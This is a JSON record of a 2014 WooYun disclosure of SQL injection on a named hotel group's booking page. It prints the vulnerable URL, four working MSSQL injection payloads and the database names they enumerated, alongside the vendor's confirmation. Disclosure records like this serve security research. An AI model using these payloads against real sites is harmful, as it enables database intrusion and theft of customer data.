{"id": 58146, "wybug_id": "wooyun-2014-052171", "wybug_title": "海航酒店另一处SQL注射漏洞", "wybug_corp": "hnahotelsandresorts.com", "wybug_author": "niliu", "wybug_date": "2014-03-03 14:57", "wybug_open_date": "2014-04-17 14:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-17：\t细节向公众公开  简要描述： 又发现一处... 详细说明：  直接上地址吧\nhttp://www.hnahotelsandresorts.com/destinations/select.aspx?hid=24&id=25&ArrivalTime=2014-02-27&DepartureTime=2014-02-28&fangshuliang=1&renjian=1&hcode=bjsjs\nhcode参数存在注入\nPlace: GETParameter: hcode    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: hid=24&id=25&ArrivalTime=2014-02-27&DepartureTime=2014-02-28&fangshuliang=1&renjian=1&hcode=bjsjs' AND 8537=8537 AND 'Rgpx'='Rgpx    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: hid=24&id=25&ArrivalTime=2014-02-27&DepartureTime=2014-02-28&fangshuliang=1&renjian=1&hcode=bjsjs' AND 2259=CONVERT(INT,(SELECT CHAR(113)+CHAR(116)+CHAR(99)+CHAR(105)+CHAR(113)+(SELECT (CASE WHEN (2259=2259) THEN CHAR(49) ELSECHAR(48) END))+CHAR(113)+CHAR(97)+CHAR(103)+CHAR(102)+CHAR(113))) AND 'rMRV'='rMRV    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: hid=24&id=25&ArrivalTime=2014-02-27&DepartureTime=2014-02-28&fangshuliang=1&renjian=1&hcode=bjsjs'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: hid=24&id=25&ArrivalTime=2014-02-27&DepartureTime=2014-02-28&fangshuliang=1&renjian=1&hcode=bjsjs' WAITFOR DELAY '0:0:5'--\n\n\n   漏洞证明：  \nweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008\n\n[*] GPweb1_en[*] GPweb_cs[*] GroupWebDB[*] GSTS[*] master[*] model[*] msdb[*] NBCRS[*] OTADB[*] PMS[*] ReportServer[*] ReportServerTempDB[*] RMS[*] TangoReport[*] tempdb\n   修复方案：  过滤，   版权声明：转载请注明来源 niliu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-03-05 15:41 厂商回复： 我们将组织人员进行修复，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-27 19:00 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @xsser 怎么这两个走小厂商了？    \n     2014-02-27 21:29 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @niliu 以我的经验同一厂商同一类型,同一个系统，的洞会走小厂商    \n     2014-02-27 21:42 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @小川 我也感觉是这样，已经放手了..    \n     2014-03-03 10:39 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @疯狗 @Finger 这个漏洞转到 hnair.com 吧。谢谢！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}